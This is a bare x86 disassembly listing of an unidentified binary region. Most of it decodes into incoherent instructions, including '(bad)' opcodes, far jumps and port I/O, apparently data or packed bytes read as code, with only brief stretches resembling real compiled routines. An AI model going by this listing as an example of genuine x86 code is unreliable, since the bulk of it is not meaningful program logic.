  40dda2:	push   esi
  40dda3:	enter  0xd68e,0xca
  40dda7:	(bad)  
  40dda9:	pop    ebp
  40ddaa:	mov    dh,bh
  40ddac:	or     ah,BYTE PTR [eax]
  40ddae:	fxch   st(1)
  40ddb0:	push   esp
  40ddb1:	out    0x12,eax
  40ddb3:	or     BYTE PTR [edx],0x1a
  40ddb6:	loopne 0x40dde6
  40ddb8:	outs   dx,DWORD PTR ss:[esi]
  40ddba:	outs   dx,DWORD PTR ds:[esi]
  40ddbb:	leave  
  40ddbc:	daa    
  40ddbd:	cmp    al,0x35
  40ddbf:	cmp    ch,dl
  40ddc1:	dec    ebp
  40ddc2:	inc    edx
  40ddc3:	(bad)  
  40ddc4:	outs   dx,BYTE PTR ds:[esi]
  40ddc5:	imul   eax,esp,0x3681c45a
  40ddcb:	jae    0x40dda4
  40ddcd:	adc    eax,0x1caaea82
  40ddd2:	leave  
  40ddd3:	inc    esi
  40ddd4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ddd5:	push   edi
  40ddd6:	inc    ebx
  40ddd7:	loopne 0x40dd85
  40ddd9:	hlt    
  40ddda:	xor    edx,eax
  40dddc:	sbb    al,0xb8
  40ddde:	pushw  0xe445
  40dde2:	push   eax
  40dde3:	aaa    
  40dde4:	fdiv   st(0),st
  40dde6:	push   ebx
  40dde7:	(bad)  
  40dde9:	sahf   
  40ddea:	aas    
  40ddeb:	aaa    
  40ddec:	xor    BYTE PTR [esp+ebx*4],al
  40ddef:	push   esi
  40ddf0:	sbb    dh,bl
  40ddf2:	inc    ebp
  40ddf3:	mov    esp,DWORD PTR [edx]
  40ddf5:	dec    eax
  40ddf6:	jbe    0x40de6b
  40ddf8:	dec    ecx
  40ddf9:	aad    0xe7
  40ddfb:	ds gs ret 0x493c
  40de00:	loope  0x40de68
  40de02:	shl    esp,1
  40de04:	in     al,0xe6
  40de06:	sahf   
  40de07:	xor    eax,0xb3e74a87
  40de0c:	or     esi,DWORD PTR [ebx+0x21996208]
  40de12:	push   ecx
  40de13:	inc    edi
  40de14:	push   ebp
  40de15:	jns    0x40de8f
  40de17:	sbb    eax,0x60355fc2
  40de1c:	test   DWORD PTR [edi-0x5853ccb4],edx
  40de22:	dec    eax
  40de23:	xor    BYTE PTR [esi+0x65716a17],0x37
  40de2a:	aas    
  40de2b:	pop    ebx
  40de2c:	ds xchg esp,eax
  40de2e:	in     al,dx
  40de2f:	mov    DWORD PTR [ecx+ebp*2],edi
  40de32:	inc    edi
  40de33:	fdivr  DWORD PTR [esi]
  40de35:	pop    esp
  40de36:	fdivr  st(1),st
  40de38:	jle    0x40deb8
  40de3a:	ffree  st(3)
  40de3c:	xchg   esi,eax
  40de3d:	repnz cmp eax,0x37d8865f
  40de43:	aaa    
  40de44:	sahf   
  40de45:	mov    eax,0xd63ffab
  40de4a:	test   BYTE PTR [edx+0x42],ah
  40de4d:	mov    DWORD PTR [edx-0x505a0e92],esi
  40de53:	pop    ds
  40de54:	xlat   BYTE PTR ds:[ebx]
  40de55:	sbb    DWORD PTR [eax+0x10],edx
  40de58:	inc    ecx
  40de59:	stos   BYTE PTR es:[edi],al
  40de5a:	js     0x40dec8
  40de5c:	or     BYTE PTR [ebx+0x4d],dl
  40de5f:	leave  
  40de60:	or     dh,ch
  40de62:	loop   0x40ddeb
  40de64:	and    ch,BYTE PTR [esi+0x51]
  40de67:	aam    0x9c
  40de69:	lea    esp,[ebx-0x66d938f8]
  40de6f:	pop    esi
  40de70:	ss mov edx,0x1eb2afc1
  40de76:	shr    dl,1
  40de78:	push   eax
  40de79:	xchg   edx,eax
  40de7a:	repnz pop esp
  40de7c:	or     eax,DWORD PTR [esi+0x61f826af]
  40de82:	sbb    dl,BYTE PTR [eax+0x67711f8]
  40de88:	push   ds
  40de89:	jp     0x40dedc
  40de8b:	jmp    0xa2c9:0x9ad218b6
  40de92:	inc    edi
  40de93:	inc    ebp
  40de94:	mov    ebx,0x836faab4
  40de9a:	fist   DWORD PTR [edi+eiz*8-0x5b]
  40de9e:	mov    al,ds:0x783fe7ed
  40dea3:	mov    BYTE PTR [edx+ebp*2-0x7e],bl
  40dea7:	neg    DWORD PTR [ecx-0x3eeff88f]
  40dead:	xor    eax,0xe65669e3
  40deb2:	stc    
  40deb3:	push   ss
  40deb4:	fmul   QWORD PTR [ecx+eax*8+0x28]
  40deb8:	jae    0x40de3e
  40deba:	aad    0x44
  40debc:	in     al,0xbe
  40debe:	dec    esi
  40debf:	push   esi
  40dec0:	(bad)  
  40dec1:	ret    
  40dec2:	inc    esi
  40dec3:	or     eax,0x945a85ae
  40dec8:	xchg   ebp,eax
  40dec9:	mov    edi,0xd4e1bd8e
  40dece:	ror    BYTE PTR ds:0x2f033693,0x13
  40ded5:	adc    edi,DWORD PTR ds:0xd1027659
  40dedc:	sub    ah,BYTE PTR [ecx]
  40dede:	mov    dl,0x8
  40dee0:	rcl    BYTE PTR [edx+0x1035a80],0x63
  40dee7:	stos   BYTE PTR es:[edi],al
  40dee8:	pop    edx
  40dee9:	call   0xe19c1e94
  40deee:	xchg   ecx,eax
  40deef:	sti    
  40def0:	scas   eax,DWORD PTR es:[edi]
  40def1:	(bad)  
  40def2:	fist   DWORD PTR [ecx-0x7b]
  40def5:	inc    edx
  40def6:	dec    eax
  40def7:	mov    dl,BYTE PTR [edi-0x10]
  40defa:	adc    al,0xda
  40defc:	sub    BYTE PTR [ebp+0x75],bh
  40deff:	mov    ecx,0x6fd933
  40df04:	cmp    ah,BYTE PTR [esi+0x759a1c4b]
  40df0a:	into   
  40df0b:	and    eax,esi
  40df0d:	sbb    ebp,DWORD PTR [eax]
  40df0f:	jo     0x40df4d
  40df11:	test   DWORD PTR [edx-0x4521e1fd],ebp
  40df17:	push   ds
  40df18:	xchg   ecx,eax
  40df19:	ficomp WORD PTR [ebp+0x4eb4c7c]
  40df1f:	bound  ebx,QWORD PTR [ebp+0x26fd1f7a]
  40df25:	ja     0x40df67
  40df27:	mov    BYTE PTR [ecx+0x34],bh
  40df2a:	mov    esp,DWORD PTR [esi]
  40df2c:	sbb    eax,0x41158be1
  40df31:	pop    edi
  40df32:	cmp    al,0xe7
  40df34:	jns    0x40df4a
  40df36:	loope  0x40df63
  40df38:	mov    al,ds:0x7897f0ca
  40df3d:	and    DWORD PTR [ebp-0x35],ebp
  40df40:	sbb    esp,edx
  40df42:	jns    0x40dfa8
  40df44:	dec    esi
  40df45:	nop
  40df46:	int    0xfa
  40df48:	in     al,0x1a
  40df4a:	push   ecx
  40df4b:	and    DWORD PTR [eax-0x6faaaf4c],0xffffff8d
  40df52:	and    cl,BYTE PTR [esi-0x6d5a751d]
  40df58:	(bad)  
  40df5a:	in     eax,dx
  40df5b:	popf   
  40df5c:	loope  0x40df71
  40df5e:	mov    edi,0x299249ce
  40df63:	push   edi
  40df64:	fwait
  40df65:	adc    dl,BYTE PTR [ecx]
  40df67:	mov    WORD PTR [edi-0x4a],ss
  40df6a:	cmp    al,0xa4
  40df6c:	or     al,0x13
  40df6e:	adc    bl,0x69
  40df71:	push   es
  40df72:	repnz call 0xc62c:0xba53a099
  40df7a:	xor    dl,BYTE PTR [ecx]
  40df7c:	pop    ebx
  40df7d:	push   0x84b89e0e
  40df82:	aaa    
  40df83:	push   ds
  40df84:	pop    esp
  40df85:	aad    0x27
  40df87:	dec    ebx
  40df88:	push   0x4843a5d
  40df8d:	mov    ebx,edx
  40df8f:	and    BYTE PTR [ebx-0x418f0062],0xeb
  40df96:	hlt    
  40df97:	pop    edx
  40df98:	mov    bh,0x33
  40df9a:	sub    al,0x73
  40df9c:	imul   esi,DWORD PTR [eax],0xd8a89ed6
  40dfa2:	mov    ecx,0x55d717d3
  40dfa7:	dec    edx
  40dfa8:	or     eax,0xbcac22c9
  40dfad:	and    eax,0x3243caa7
  40dfb2:	dec    esp
  40dfb3:	mov    ah,0xfc
  40dfb5:	sahf   
  40dfb6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dfb7:	push   ebx
  40dfb8:	xchg   BYTE PTR [eax],ah
  40dfba:	jo     0x40dfe6
  40dfbc:	lods   eax,DWORD PTR ds:[esi]
  40dfbd:	sub    esp,eax
  40dfbf:	or     al,0xf8
  40dfc1:	aad    0x17
  40dfc3:	cli    
  40dfc4:	mov    dh,0x6c
  40dfc6:	xchg   edi,eax
  40dfc7:	(bad)  
  40dfc8:	test   eax,0x7435eb96
  40dfcd:	and    eax,0xf2f63ef0
  40dfd2:	shl    DWORD PTR [ebx],1
  40dfd4:	bound  ebp,QWORD PTR [ecx+0x32c7e40f]
  40dfda:	jecxz  0x40df7f
  40dfdc:	sbb    BYTE PTR fs:[eax-0x67],0x9f
  40dfe1:	pop    es
  40dfe2:	push   0xffffff9d
  40dfe4:	adc    ch,al
  40dfe6:	sbb    ebx,DWORD PTR [ebx]
  40dfe8:	and    ebx,DWORD PTR [esi+0x158b2ce6]
  40dfee:	repz call 0xbf953ca4
  40dff4:	pushf  
  40dff5:	mov    eax,ds:0x41cc3a01
  40dffa:	(bad)  
  40dffb:	or     esi,DWORD PTR [ebx-0x413480b5]
  40e001:	je     0x40df86
  40e003:	push   edi
  40e004:	push   cs
  40e005:	sub    ecx,ebx
  40e007:	dec    ecx
  40e008:	mov    eax,ds:0xfa90dfd7
  40e00d:	xor    BYTE PTR [ecx],bl
  40e00f:	mov    dl,ah
  40e011:	outs   dx,DWORD PTR ds:[esi]
  40e012:	imul   esp,DWORD PTR [ecx+0x7679461d],0x62
  40e019:	ins    BYTE PTR es:[edi],dx
  40e01a:	shr    BYTE PTR ds:0x2638e7be,cl
  40e020:	xor    eax,0xf7149411
  40e025:	arpl   WORD PTR [ebx-0x3d0cb51a],cx
  40e02b:	xchg   edi,eax
  40e02c:	jmp    0x9f2b:0x7a71ce55
  40e033:	lods   al,BYTE PTR ds:[esi]
  40e034:	sub    bl,BYTE PTR [eax+0x228c8e88]
  40e03a:	xor    DWORD PTR [edi-0x37],edx
  40e03d:	adc    eax,0x6dc43a69
  40e042:	ficomp WORD PTR [ebx+0x3f]
  40e045:	or     BYTE PTR [esi+0x54677d40],ah
  40e04b:	adc    esi,0xff33e106
  40e051:	add    ecx,ebx
  40e053:	mov    DWORD PTR [ebp-0x20],ecx
  40e056:	mov    eax,ds:0x434416
  40e05b:	mov    eax,DWORD PTR [ebp-0x20]
  40e05e:	jmp    0x40e452
  40e063:	xlat   BYTE PTR ds:[ebx]
  40e064:	frstor [esi-0xeac49ad]
  40e06a:	pop    ecx
  40e06b:	test   DWORD PTR [ecx],0x312ebaa7
  40e071:	addr16 lahf 
  40e073:	stc    
  40e074:	xchg   edx,eax
  40e075:	jo     0x40e0e7
  40e077:	dec    ecx
  40e078:	jge    0x40e0ea
  40e07a:	jo     0x40e0c9
  40e07c:	pop    ebp
  40e07d:	ds std 
  40e07f:	pop    ebp
  40e080:	imul   eax,DWORD PTR [edx],0x37
  40e083:	(bad)  
  40e084:	mov    esi,0xa6dc54af
  40e089:	xlat   BYTE PTR ds:[ebx]
  40e08a:	pop    ecx
  40e08b:	xchg   ecx,eax
  40e08c:	(bad)  
  40e08d:	hlt    
  40e08e:	inc    eax
  40e08f:	(bad)  
  40e090:	xor    al,dh
  40e092:	ret    0xa13b
  40e095:	stc    
  40e096:	fistp  DWORD PTR [ecx]
  40e098:	int3   
  40e099:	pop    edi
  40e09a:	mov    fs,WORD PTR [edx+eax*4-0x6265dac3]
  40e0a1:	inc    edx
  40e0a2:	dec    ecx
  40e0a3:	test   BYTE PTR [ebx],bh
  40e0a5:	jns    0x40e0ca
  40e0a7:	or     BYTE PTR [ebx+ebp*8-0x53],0xcd
  40e0ac:	sar    BYTE PTR [esp],0xc0
  40e0b0:	mov    BYTE PTR [ebx-0x53e2440],0x2d
  40e0b7:	dec    ebx
  40e0b8:	mov    ebp,0xcf29824f
  40e0bd:	jmp    0x8dec:0xe633b08d
  40e0c4:	adc    dh,ch
  40e0c6:	mov    WORD PTR [esi+0x35],es
  40e0c9:	jle    0x40e11e
  40e0cb:	push   cs
  40e0cc:	pop    ebx
  40e0cd:	mov    esp,ebp
  40e0cf:	push   eax
  40e0d0:	aaa    
  40e0d1:	aaa    
  40e0d2:	test   al,0x21
  40e0d4:	loope  0x40e085
  40e0d6:	sub    DWORD PTR ds:0x9e9e08ca,esi
  40e0dc:	xchg   esp,eax
  40e0dd:	sub    dh,BYTE PTR [ecx-0x75033d9a]
  40e0e3:	int3   
  40e0e4:	(bad)  
  40e0e5:	div    BYTE PTR [edx]
  40e0e7:	dec    esi
  40e0e8:	loop   0x40e090
  40e0ea:	clc    
  40e0eb:	loopne 0x40e0ec
  40e0ed:	push   ebp
  40e0ee:	push   ecx
  40e0ef:	imul   ebx,esp,0xffffffd6
  40e0f2:	out    0xc0,eax
  40e0f4:	or     al,0x2
  40e0f6:	or     ebx,edi
  40e0f8:	mov    al,ds:0xfc22fff0
  40e0fd:	sbb    eax,0x44b8c7c3
  40e102:	pop    es
  40e103:	pop    eax
  40e104:	cmp    cl,BYTE PTR [edx+ebp*8]
  40e107:	(bad)  
  40e108:	call   0xfa98:0xe88bd9da
  40e10f:	mov    dh,0xa8
  40e111:	sbb    al,0x89
  40e113:	inc    ebp
  40e114:	leave  
  40e115:	ret    0x61d
  40e118:	test   al,0x6c
  40e11a:	or     eax,0xc8d163fb
  40e11f:	lods   eax,DWORD PTR ds:[esi]
  40e120:	mov    ecx,0xb63d5fe6
  40e125:	xchg   ebp,eax
  40e126:	pop    ebp
  40e127:	int    0xe3
  40e129:	lock inc ebx
  40e12b:	jo     0x40e140
  40e12d:	adc    ah,BYTE PTR [ebp+0x22]
  40e130:	pop    ss
  40e131:	mov    edi,0xd10036d1
  40e136:	out    dx,al
  40e137:	dec    edi
  40e138:	xor    ah,BYTE PTR [edx]
  40e13a:	mov    ds:0x8356e274,eax
  40e13f:	push   ebx
  40e140:	sahf   
  40e141:	out    dx,al
  40e142:	sbb    dl,BYTE PTR [esi+esi*8]
  40e145:	sub    BYTE PTR [esi],al
  40e147:	repnz dec esi
  40e149:	pop    eax
  40e14a:	loope  0x40e131
  40e14c:	xchg   esp,eax
  40e14d:	outs   dx,BYTE PTR ds:[esi]
  40e14e:	adc    eax,esp
  40e150:	mov    ah,0xb4
  40e152:	mov    eax,0xcc2b2358
  40e157:	jg     0x40e159
  40e159:	ret    0x48d2
  40e15c:	iret   
  40e15d:	sar    BYTE PTR [ecx-0x1064edf0],1
  40e163:	mov    edx,DWORD PTR [edi+0x74]
  40e166:	nop
  40e167:	jmp    0x11c5:0xf644eda4
  40e16e:	pop    es
  40e16f:	je     0x40e19a
  40e171:	cmp    edx,0x7005cb20
  40e177:	shr    DWORD PTR [esi-0x71],cl
  40e17a:	fwait
  40e17b:	cs test ecx,edx
  40e17e:	arpl   WORD PTR [ebp+0x51],bp
  40e181:	sub    eax,DWORD PTR [esi+0x30c385b2]
  40e187:	test   BYTE PTR [ebp+0x42],ah
  40e18a:	jp     0x40e1be
  40e18c:	ja     0x40e209
  40e18e:	mov    esp,esp
  40e190:	or     eax,0xdb9417e9
  40e195:	add    ebp,DWORD PTR [edi+0x4e]
  40e198:	bound  edi,QWORD PTR [esi-0x4]
  40e19b:	ins    BYTE PTR es:[edi],dx
  40e19c:	adc    BYTE PTR [eax-0x683959fb],0x60
  40e1a3:	jo     0x40e1d6
  40e1a5:	lds    edi,FWORD PTR [ebp+0x75]
  40e1a8:	mov    WORD PTR [edi],ax
  40e1ab:	mov    ah,0xe9
  40e1ad:	jne    0x40e1aa
  40e1af:	mov    fs,ecx
  40e1b1:	data16 daa 
  40e1b3:	jp     0x40e182
  40e1b5:	out    0x6e,eax
  40e1b7:	dec    ebx
  40e1b8:	je     0x40e1b6
  40e1ba:	rol    BYTE PTR [edx+0x33],0x9
  40e1be:	mov    ebx,0xc80ec877
  40e1c3:	xchg   esi,eax
  40e1c4:	fwait
  40e1c5:	dec    ebx
  40e1c6:	aaa    
  40e1c7:	sub    DWORD PTR [ecx-0x36],0xffffffc3
  40e1cb:	push   cs
  40e1cc:	add    DWORD PTR [ebx+0x6a6d6bde],edx
  40e1d2:	pop    ds
  40e1d3:	and    al,BYTE PTR [ebx-0x1e]
  40e1d6:	fcomp  QWORD PTR [edx+0x38]
  40e1d9:	lods   al,BYTE PTR ds:[esi]
  40e1da:	pushf  
  40e1db:	fs jmp 0x1a0cd63b
  40e1e1:	sbb    BYTE PTR [esi+0x462acbda],dh
  40e1e7:	mov    edx,0x966d7a64
  40e1ec:	popa   
  40e1ed:	sub    eax,0xd35c2d34
  40e1f2:	xor    eax,0x7bd24ee
  40e1f7:	mov    WORD PTR [ecx+0x345ac20c],ss
  40e1fd:	mov    dl,0xf4
  40e1ff:	jle    0x40e248
  40e201:	cmp    bh,BYTE PTR gs:[ebx]
  40e204:	and    ebx,DWORD PTR [eax+0x1b]
  40e207:	dec    esp
  40e208:	push   esi
  40e209:	(bad)  
  40e20a:	loopne 0x40e258
  40e20c:	test   DWORD PTR ds:0x6d7021f1,eax
  40e212:	and    BYTE PTR [edi-0x62e2e840],0x48
  40e219:	js     0x40e1ba
  40e21b:	lods   al,BYTE PTR ds:[esi]
  40e21c:	xor    BYTE PTR [esi+0x60],bh
  40e21f:	pushf  
  40e220:	push   ds
  40e221:	mov    ds:0xacaa432f,al
  40e226:	or     BYTE PTR [esi],bl
  40e228:	push   edx
  40e229:	xchg   esp,eax
  40e22a:	pop    esp
  40e22b:	mov    ebx,DWORD PTR [eax-0x9ed10e]
  40e231:	hlt    
  40e232:	push   esp
  40e233:	inc    DWORD PTR [edx+0x1ce85233]
  40e239:	(bad)  
  40e23a:	shr    BYTE PTR [eax+0x466efb7e],1
  40e240:	sub    al,0x1f
  40e242:	retf   0xacff
  40e245:	out    dx,al
  40e246:	scas   eax,DWORD PTR es:[edi]
  40e247:	mov    al,0x42
  40e249:	push   esi
  40e24a:	in     al,0x22
  40e24c:	sti    
  40e24d:	aad    0x70
  40e24f:	jne    0x40e2bd
  40e251:	push   cs
  40e252:	push   ebp
  40e253:	je     0x40e254
  40e255:	mov    DWORD PTR [esi-0x22],ebp
  40e258:	cmp    eax,0x57b19b44
  40e25d:	ds jb  0x40e29e
  40e260:	sahf   
  40e261:	out    dx,eax
  40e262:	xlat   BYTE PTR ds:[ebx]
  40e263:	mov    ch,0x3d
  40e265:	mov    ds:0x67fd162f,eax
  40e26a:	ins    DWORD PTR es:[edi],dx
  40e26b:	or     ch,BYTE PTR [edi-0x70]
  40e26e:	mov    ecx,0x3f6e0ffb
  40e273:	std    
  40e274:	xor    eax,0x43c558f1
  40e279:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e27a:	adc    ebp,DWORD PTR [edx+eax*4+0x510f93fc]
  40e281:	inc    esi
  40e282:	aaa    
  40e283:	popf   
  40e284:	push   esi
  40e285:	push   edi
  40e286:	int3   
  40e287:	cmp    al,0xda
  40e289:	adc    edi,edi
  40e28b:	add    al,0x65
  40e28d:	jne    0x40e2ec
  40e28f:	imul   edx,DWORD PTR ds:0xc41b2cba,0x72
  40e296:	xchg   edi,eax
  40e297:	inc    eax
  40e298:	ds lahf 
  40e29a:	adc    esi,ebx
  40e29c:	sbb    DWORD PTR [ebx+0x3700b0c4],ecx
  40e2a2:	je     0x40e2a7
  40e2a4:	lock xor BYTE PTR [ebp-0x5a092e3c],0x8a
  40e2ac:	inc    edi
  40e2ad:	imul   eax,DWORD PTR [ebx-0x5d],0xffffffa2
  40e2b1:	adc    BYTE PTR [ebp+0x1358e152],cl
  40e2b7:	push   edx
  40e2b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e2b9:	mov    dh,0x1c
  40e2bb:	or     DWORD PTR [esi-0x22452b23],esp
  40e2c1:	pushf  
  40e2c2:	xchg   ebx,eax
  40e2c3:	xchg   ecx,eax
  40e2c4:	stos   BYTE PTR es:[edi],al
  40e2c5:	inc    ebx
  40e2c6:	mov    cl,0x60
  40e2c8:	pop    ss
  40e2c9:	add    ch,cl
  40e2cb:	push   esp
  40e2cc:	icebp  
  40e2cd:	push   edx
  40e2ce:	mov    esp,DWORD PTR [ebp+ecx*1+0x47fb2ca5]
  40e2d5:	xor    DWORD PTR [eax-0x654e2f9e],esi
  40e2db:	sahf   
  40e2dc:	jl     0x40e27f
  40e2de:	inc    esp
  40e2df:	sti    
  40e2e0:	sahf   
  40e2e1:	mov    dh,0xf8
  40e2e3:	adc    DWORD PTR [ecx],0x412f5bb6
  40e2e9:	in     eax,0xe3
  40e2eb:	mov    ebx,eax
  40e2ed:	hlt    
  40e2ee:	dec    edx
  40e2ef:	xor    eax,0x2edda0b8
  40e2f4:	xor    eax,0x8de7f702
  40e2f9:	pusha  
  40e2fa:	fwait
  40e2fb:	int    0xca
  40e2fd:	sbb    eax,0xc7eff9cf
  40e302:	gs adc eax,0x228ab2a8
  40e308:	les    edi,FWORD PTR [ecx+0x26]
  40e30b:	in     al,dx
  40e30c:	fbstp  TBYTE PTR [esi+0x57a0f5ce]
  40e312:	add    eax,0x4d890840
  40e317:	outs   dx,DWORD PTR ds:[esi]
  40e318:	mov    bh,al
  40e31a:	in     al,dx
  40e31b:	mov    ecx,0xedc86ebd
  40e320:	jnp    0x40e337
  40e322:	push   es
  40e323:	lods   eax,DWORD PTR ds:[esi]
  40e324:	pop    es
  40e325:	mov    edx,0xd64d96ce
  40e32a:	add    edi,edi
  40e32c:	adc    ah,BYTE PTR [esi]
  40e32e:	xlat   BYTE PTR ds:[ebx]
  40e32f:	mov    esi,0x7c2a3eb1
  40e334:	pushf  
  40e335:	fs cwde 
  40e337:	daa    
  40e338:	push   esi
  40e339:	xor    BYTE PTR [ecx-0x2314cf5f],ah
  40e33f:	or     eax,DWORD PTR [edx+0x44352327]
  40e345:	push   eax
  40e346:	pop    eax
  40e347:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e348:	leave  
  40e349:	je     0x40e332
  40e34b:	aam    0xca
  40e34d:	test   DWORD PTR [esi+0x135fc275],esp
  40e353:	mov    cs,WORD PTR [ecx+0x4da6e187]
  40e359:	adc    al,0x16
  40e35b:	push   edi
  40e35c:	or     BYTE PTR [ebx],ch
  40e35e:	jge    0x40e307
  40e360:	jecxz  0x40e39a
  40e362:	adc    BYTE PTR [ebx],ch
  40e364:	addr16 mov fs,edi
  40e367:	push   edi
  40e368:	arpl   WORD PTR [ecx+0x131c0f5e],di
  40e36e:	int3   
  40e36f:	push   ecx
  40e370:	push   esi
  40e371:	shl    DWORD PTR [ebp-0x17369e17],1
  40e377:	and    eax,0x27179d67
  40e37c:	daa    
  40e37d:	or     BYTE PTR [edx+0x75fba565],al
  40e383:	loop   0x40e321
  40e385:	and    esi,DWORD PTR [ebp+0x79]
  40e388:	scas   al,BYTE PTR es:[edi]
  40e389:	into   
  40e38a:	inc    ebx
  40e38b:	test   eax,0xb0cef997
  40e390:	popa   
  40e391:	jmp    0x40e31b
  40e393:	mov    edi,0x4ed433b2
  40e398:	fstp   QWORD PTR [esi+0x6a]
  40e39b:	out    0xc2,eax
  40e39d:	pop    ebp
  40e39e:	mov    esi,0xce92e7f8
  40e3a3:	pop    es
  40e3a4:	fcmovu st,st(3)
  40e3a6:	mov    ecx,0x24789e17
  40e3ab:	push   eax
  40e3ac:	mov    cl,0x4d
  40e3ae:	sbb    BYTE PTR [ebx+esi*8+0x9],0x21
  40e3b3:	sub    DWORD PTR [edi],eax
  40e3b5:	pop    ds
  40e3b6:	sub    al,0xdc
  40e3b8:	mov    ds:0xf7309abd,al
  40e3bd:	xchg   edi,eax
  40e3be:	or     dh,bl
  40e3c0:	(bad)  
  40e3c1:	xchg   ecx,eax
  40e3c2:	inc    eax
  40e3c3:	add    edi,ebx
  40e3c5:	xor    al,0x38
  40e3c7:	or     cl,BYTE PTR [esi*2-0xaa39c9c]
  40e3ce:	das    
  40e3cf:	inc    esp
  40e3d0:	inc    eax
  40e3d1:	xchg   DWORD PTR [edi+0x68],ebp
  40e3d4:	daa    
  40e3d5:	in     al,dx
  40e3d6:	dec    ecx
  40e3d7:	or     BYTE PTR [edx+0x490013b2],0x6e
  40e3de:	mov    eax,0x1697b218
  40e3e3:	mov    ecx,0x848d9ece
  40e3e8:	fstp   DWORD PTR [edx-0x11520866]
  40e3ee:	jge    0x40e410
  40e3f0:	sub    al,ch
  40e3f2:	jo     0x40e3d9
  40e3f4:	mov    eax,esi
  40e3f6:	clc    
  40e3f7:	loope  0x40e390
  40e3f9:	jmp    0x40e38d
  40e3fb:	test   eax,0xbd4e9372
  40e400:	jmp    0xaaef:0xadbd07ae
  40e407:	mov    ecx,0xe954d090
  40e40c:	mov    ebx,0xab67735e
  40e411:	push   bx
  40e413:	in     al,dx
  40e414:	xchg   al,bl
  40e416:	mov    dh,0xb9
  40e418:	sbb    BYTE PTR [edi+0x3bd0784a],ch
  40e41e:	jge    0x40e48b
  40e420:	mov    edi,0xe6295ec4
  40e425:	or     ecx,ebp
  40e427:	jge    0x40e49f
  40e429:	leave  
  40e42a:	jae    0x40e42c
  40e42c:	add    ebx,edx
  40e42e:	iret   
  40e42f:	xchg   DWORD PTR [edx],ebp
  40e431:	add    esp,DWORD PTR ds:0x18fc5afc
  40e437:	aad    0xab
  40e439:	adc    al,0x5d
  40e43b:	lods   eax,DWORD PTR ds:[esi]
  40e43c:	iret   
  40e43d:	cmp    eax,0x7ec1811e
  40e442:	xchg   ebp,eax
  40e443:	fisub  WORD PTR [ecx]
  40e445:	popa   
  40e446:	rep stos DWORD PTR es:[edi],eax
  40e448:	xor    eax,0xa96a035b
  40e44d:	pop    edi
  40e44e:	mov    ah,0xe6
  40e450:	pop    ss
  40e451:	popf   
  40e452:	je     0x40fd56
  40e458:	movzx  eax,BYTE PTR ds:0x434402
  40e45f:	add    DWORD PTR ds:0x43449d,eax
  40e465:	mov    eax,DWORD PTR [ebp-0x4]
  40e468:	or     DWORD PTR ds:0x432e5a,0x432770
  40e472:	xor    eax,0x7510855
  40e477:	add    eax,ebx
  40e479:	mov    DWORD PTR ds:0x432e42,0x11db
  40e483:	cmp    edi,eax
  40e485:	jne    0x40f511
  40e48b:	push   DWORD PTR [ebp+0x8]
  40e48e:	adc    DWORD PTR ds:0x434412,0x8a5
  40e498:	call   0x40bc0c
  40e49d:	mov    DWORD PTR [ebp-0x20],eax
  40e4a0:	add    eax,0x438
  40e4a5:	mov    eax,DWORD PTR [ebp-0x4]
  40e4a8:	jmp    0x40e89c
  40e4ad:	fs pop ss
  40e4af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e4b0:	sbb    BYTE PTR [ecx-0x4a],dh
  40e4b3:	popa   
  40e4b4:	push   ebx
  40e4b5:	neg    BYTE PTR [ecx+edx*1+0x19]
  40e4b9:	adc    edi,DWORD PTR [edi-0x6a]
  40e4bc:	push   ecx
  40e4bd:	rcr    BYTE PTR [esi+0x7d497070],cl
  40e4c3:	jo     0x40e535
  40e4c5:	xchg   ecx,eax
  40e4c6:	mov    ah,0x5e
  40e4c8:	xor    BYTE PTR [eax+0x35],cl
  40e4cb:	repnz mov ah,0xb9
  40e4ce:	fbstp  TBYTE PTR [edi]
  40e4d0:	(bad)  
  40e4d1:	cmc    
  40e4d2:	and    eax,0x58193785
  40e4d7:	jo     0x40e4c8
  40e4d9:	jno    0x40e4d2
  40e4db:	enter  0xba11,0x7
  40e4df:	into   
  40e4e0:	jnp    0x40e4be
  40e4e2:	sub    al,0x8c
  40e4e4:	pushf  
  40e4e5:	pushf  
  40e4e6:	xchg   edi,eax
  40e4e7:	jge    0x40e53f
  40e4e9:	inc    ecx
  40e4ea:	enter  0xe32d,0x52
  40e4ee:	push   eax
  40e4ef:	push   eax
  40e4f0:	pop    ss
  40e4f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e4f2:	jnp    0x40e49a
  40e4f4:	sbb    cl,BYTE PTR [eax+0x7c]
  40e4f7:	pusha  
  40e4f8:	xlat   BYTE PTR ds:[ebx]
  40e4f9:	sub    BYTE PTR [ebp+0x12],0x36
  40e4fd:	out    0x85,al
  40e4ff:	lea    edx,[eax+0x8e53cc3]
  40e505:	xor    al,0xa0
  40e507:	ds xchg bl,bl
  40e50a:	aaa    
  40e50b:	xor    eax,0xcfb4dc8c
  40e510:	popf   
  40e511:	mov    ds:0x981a14b5,al
  40e516:	and    bl,bh
  40e518:	xor    eax,DWORD PTR [esi+0x79]
  40e51b:	push   ds
  40e51c:	push   esp
  40e51d:	cmp    eax,0xfc945ff
  40e522:	dec    edx
  40e523:	scas   al,BYTE PTR es:[edi]
  40e524:	mov    gs,WORD PTR [ecx+edx*4+0x38]
  40e528:	xchg   ecx,eax
  40e529:	inc    ebp
  40e52a:	inc    ebx
  40e52b:	sti    
  40e52c:	retf   0xa1fc
  40e52f:	imul   ebx,DWORD PTR [ebx+esi*2],0x8
  40e533:	inc    esp
  40e534:	pop    es
  40e535:	push   ebp
  40e536:	enter  0xfd6f,0x20
  40e53a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e53b:	enterw 0xd79d,0x5b
  40e540:	arpl   ax,di
  40e542:	aam    0x70
  40e544:	sar    BYTE PTR [esi-0x6b],0x16
  40e548:	retfw  0x11c1
  40e54c:	jns    0x40e4fc
  40e54e:	fsubr  st(5),st
  40e550:	into   
  40e551:	imul   ebx,eax,0x401a0a6e
  40e557:	xchg   esp,eax
  40e558:	push   esp
  40e559:	xor    DWORD PTR [ebx],edi
  40e55b:	sahf   
  40e55c:	das    
  40e55d:	dec    esp
  40e55e:	mov    WORD PTR [ecx],cs
  40e560:	outs   dx,DWORD PTR ds:[esi]
  40e561:	xchg   esi,eax
